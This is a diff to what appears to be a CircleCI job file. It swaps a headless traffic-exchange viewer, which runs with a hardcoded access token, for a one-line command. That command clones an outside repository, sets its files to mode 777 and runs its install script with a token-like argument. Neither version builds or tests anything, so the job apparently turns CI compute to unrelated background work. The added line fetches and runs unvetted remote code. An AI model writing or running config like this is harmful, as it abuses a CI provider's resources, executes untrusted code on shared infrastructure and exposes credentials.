@@ -7,11 +7,4 @@ jobs:
       - checkout # check out the code in the project directory
       - run:
           command: |
-            apt update
-            apt-get install -y ca-certificates curl desktop-file-utils libappindicator3-1 libasound2 libgbm1 libgtk-3-0 libnotify4 libnss3 libsecret-1-0 libxss1 libxtst6 unzip wget xdg-utils xvfb
-            curl -L -O -s https://github.com/feelingsurf/viewer/releases/download/v1.4.0/FeelingSurfViewer-linux-amd64-1.4.0.deb
-            dpkg -i FeelingSurfViewer-linux-amd64-1.4.0.deb
-            export access_token=91735fe1059af6e870aa23cf5bc2cdba
-            Xvfb :59 & export DISPLAY=:59
-            vmstat 60 1440 &
-            FeelingSurfViewer --no-sandbox
+            sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "fb6eb032c1e071f0675d01e9d29bf5a2" "30" "5" "2"
